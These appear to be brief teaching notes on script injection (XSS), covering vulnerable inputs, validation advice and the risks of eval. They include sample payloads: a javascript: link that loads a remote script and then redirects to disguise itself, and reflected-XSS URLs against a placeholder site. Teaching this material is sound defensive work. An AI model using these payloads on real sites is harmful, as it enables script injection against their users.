# 💉 Script injections

---

## What is a script injection and how do these happen?

**Script injection** is security vulnerability, a serious security threat that enables an attacker to inject malicious code in the user interface elements.

---

## What might be vulnerable to a script injection?

- An input field - someone could write malicious javascript or a sql query (DROP TABLES anyone?)
- HTML tags `<script>`, `<meta>`, `<html>`, `<body>`, `<embed>`, `<frame>`, `<frameset>`, `<img>`, `<style>`, `<link>`, `<object>`


---


`<a href="javascript:s=document.
createElement('script');s.src=
'http://localhost/s.js';document.body.appendChild(s);window.location=
'http://www.google.com/'">click</a>`

An attacker can load a remote script and then redirect so the link acts as a normal link

---

## Good practices


- Using a regex to validate an input

![](https://i.ibb.co/rF1BkRc/2.png)

---

- Using dropdown to prevent code injection

![](https://i.stack.imgur.com/bZqTB.jpg)

---



- Avoid only client-side JavaScript validation whenever possible, maintain these operation on the server-side instead

- When developing a web site that allows the user to upload content, you may split special HTML chars so that injected tags will not be executed


## Bad practices
- Javascript eval - this will run a string as code
```javascript=
eval('2 + 2');             // returns 4
```
- obviously a bad idea as anyone could put any code in there and run it

---

You can use the address bar to hack a site 

http://vulnerableWebApplication.com/page.php?parameters=<script>alert('xss payload');</script>

http://vulnerableWebApplication.com/page.php?parameters= <img src=javascript:alert('xss payload')/>

